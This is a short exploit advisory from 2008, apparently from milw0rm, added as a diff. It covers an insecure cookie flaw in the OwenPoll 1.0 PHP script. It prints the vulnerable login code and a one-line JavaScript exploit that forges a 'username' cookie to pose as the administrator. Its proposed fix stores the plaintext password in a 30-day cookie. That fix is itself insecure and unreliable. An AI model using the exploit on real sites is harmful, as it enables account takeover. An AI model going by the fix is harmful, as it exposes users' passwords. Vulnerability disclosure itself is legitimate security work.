@@ -1,0 +1,48 @@
+[START]
+
+####################################################################################################################
+[0x01] Informations:
+
+Script         : OwenPoll 1.0
+Download       : http://www.hotscripts.com/jump.php?listing_id=75178&jump_type=1
+Vulnerability  : Insecure Cookie Handling
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+Greets:        : x0r, emgent, Jay, str0ke, Todd and AlpHaNiX
+
+
+####################################################################################################################
+[0x02] Bug: [Insecure Cookie Handling]
+######
+
+Bugged file is: /[path]/checkloginmini.php
+
+[CODE]
+
+    if (($loggedinname == $adminusername) AND ($loggedinpass == $adminpass)){
+        // authentication was successful
+        // create session and set cookie with username
+        session_start();
+        $_SESSION['auth'] = 1;
+     
+        setcookie("username", $_POST['txtusername'], time()+(86400*30));
+
+[/CODE]
+
+If we log in correctly, a cookie is set with name "username" and as content the username name.
+
+[!] FIX: Set as content username's password.
+
+[CODE] setcookie("username", $_POST['txtpassword'], time()+(86400*30)); [/CODE]
+
+
+[!] EXPLOIT: javascript:document.cookie = "username=admin_username; path=/";
+             *admin_username is the nick of the administrator
+
+####################################################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-28]
